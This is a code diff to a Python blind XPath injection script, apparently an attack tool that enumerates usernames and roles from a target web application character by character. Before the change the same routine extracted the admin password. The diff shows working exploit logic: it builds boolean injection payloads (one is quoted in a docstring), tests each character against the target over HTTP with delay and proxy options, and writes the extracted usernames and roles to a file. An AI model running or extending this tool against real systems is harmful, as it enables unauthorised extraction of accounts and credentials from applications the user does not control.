@@ -66,7 +66,7 @@ def parse_args():
         "--output",
         type=str,
         default="discovered_admins.txt",
-        help="File to write discovered admin usernames"
+        help="File to write discovered usernames and roles"
     )
 
     parser.add_argument(
@@ -97,12 +97,13 @@ def search_users_and_role(max_guess, target, delay, proxy=None):
     XPath query: username = ' or substring(//user[1]/username/text(), 1, 1) = 'c' or '
     """
 
-    users = []
+    users = {}
 
     for index in range(1, max_guess):
         name = find_user(index, target, delay, proxy)
         if name:
-            users.append(name)
+            role = find_role(index, target, delay, proxy)
+            users[name] = role
         else:
             break
 
@@ -146,19 +147,19 @@ def find_role(index, target, delay, proxy=None):
 
     char_set = get_characters()
 
-    password = ''
+    role = ''
     i = 1
     while True:
         found_character = False
 
         for char in char_set:
-            xpath_query = build_payload(index, i, char,"password")
+            xpath_query = build_payload(index, i, char,"role")
             if delay:
                 time.sleep(delay)
             status = test_char(xpath_query, target, proxy)
             if status == 200:  
-                password += char
-                print_progress("[+] Matched: ", password)
+                role += char
+                print_progress("[+] Matched: ", role)
                 i += 1
                 found_character = True
                 break
@@ -166,9 +167,9 @@ def find_role(index, target, delay, proxy=None):
                 continue
 
         if not found_character:
-            if password:
-                print_final("Final admin password", password)
-                return password
+            if role:
+                print_final("Final role", role)
+                return role
             else:
                 print(f"[-] No match at index {index}")
                 break
@@ -212,12 +213,12 @@ def main():
         data = search_users_and_role(args.max_guess, args.target, args.delay, args.proxy)
     else:
         print("Missing choice.")
-        SystemExit.code(0)
+        sys.exit(0)
 
     if args.output:
         with open(args.output, 'w') as f:
-            for line in data:
-                f.write(f"{line}\n")
+            for key, value in data.items():
+                f.write(f"{key} : {value}\n")
 
 
 if __name__ == "__main__":
